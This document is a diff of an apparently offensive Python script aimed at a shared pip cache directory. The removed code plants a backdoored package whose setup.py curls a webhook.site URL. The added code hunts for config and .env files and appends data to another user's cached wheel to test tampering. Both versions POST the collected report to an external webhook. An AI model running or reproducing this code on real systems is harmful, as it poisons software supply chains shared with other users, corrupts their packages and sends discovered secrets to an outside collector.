@@ -4,47 +4,41 @@ import subprocess
 WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"
 CACHE_PATH = "/opt/pip-cache"
 
-def run_cache_poisoning():
+def analyze_neighbors():
     report = []
     
-    # 1. Проверяем возможность записи
-    test_file = os.path.join(CACHE_PATH, ".health_check")
+    # 1. Проверяем владельцев файлов
+    # Если мы видим разные UID/GID, значит кеш общий для разных пользователей
     try:
-        with open(test_file, "w") as f:
-            f.write("Lumos was here")
-        report.append(f"[+] Write access to {CACHE_PATH} confirmed.")
-    except Exception as e:
-        report.append(f"[-] No write access to {CACHE_PATH}: {e}")
-        return "\n".join(report)
-
-    # 2. Ищем существующие пакеты для подмены
-    # Мы ищем .whl файлы или папки с исходниками
-    try:
-        content = subprocess.getoutput(f"ls -R {CACHE_PATH} | grep .whl | head -n 5")
-        report.append(f"[*] Found cached wheels:\n{content}")
+        ls_la = subprocess.getoutput(f"ls -la {CACHE_PATH} | head -n 20")
+        report.append(f"[*] Directory Permissions:\n{ls_la}")
     except:
-        report.append("[-] Could not list cache content.")
+        pass
 
-    # 3. PoC: Создаем фейковую зависимость
-    # В реальности тут можно подменить популярный пакет (н-р requests)
-    poison_dir = os.path.join(CACHE_PATH, "pip_backdoor")
+    # 2. Ищем конфиги или секреты, которые могли случайно попасть в кеш
     try:
-        if not os.path.exists(poison_dir):
-            os.makedirs(poison_dir)
-        
-        with open(os.path.join(poison_dir, "setup.py"), "w") as f:
-            f.write("from setuptools import setup\n")
-            f.write("import os\n")
-            f.write(f"os.system('curl -X POST -d \"BACKDOOR_EXECUTED_FROM_CACHE\" {WEBHOOK_URL}')\n")
-            f.write("setup(name='pip_backdoor', version='0.1')\n")
-            
-        report.append(f"[!] Created poison package at {poison_dir}")
-    except Exception as e:
-        report.append(f"[-] Failed to create poison package: {e}")
+        secrets = subprocess.getoutput(f"find {CACHE_PATH} -name '*config*' -o -name '*.env*' | head -n 5")
+        if secrets:
+            report.append(f"[!] Potential secrets found:\n{secrets}")
+        else:
+            report.append("[*] No obvious secrets in cache filenames.")
+    except:
+        pass
+
+    # 3. Проверка: Можем ли мы модифицировать чужой Wheel?
+    # (Это просто проверка прав, без порчи данных)
+    wheels = subprocess.getoutput(f"find {CACHE_PATH} -name '*.whl' | head -n 1")
+    if wheels:
+        target_wheel = wheels.strip()
+        try:
+            with open(target_wheel, "ab") as f:
+                f.write(b"\n# Lumos Integrity Check")
+            report.append(f"[!!!] SUCCESS: Can modify existing wheel: {target_wheel}")
+        except:
+            report.append(f"[-] Cannot modify existing wheel: {target_wheel}")
 
     return "\n".join(report)
 
 if __name__ == "__main__":
-    result = run_cache_poisoning()
-    # Отправляем полный отчет на вебхук
-    subprocess.run(['curl', '-s', '-X', 'POST', '-d', result, WEBHOOK_URL])
+    final_report = analyze_neighbors()
+    subprocess.run(['curl', '-s', '-X', 'POST', '-d', final_report, WEBHOOK_URL])
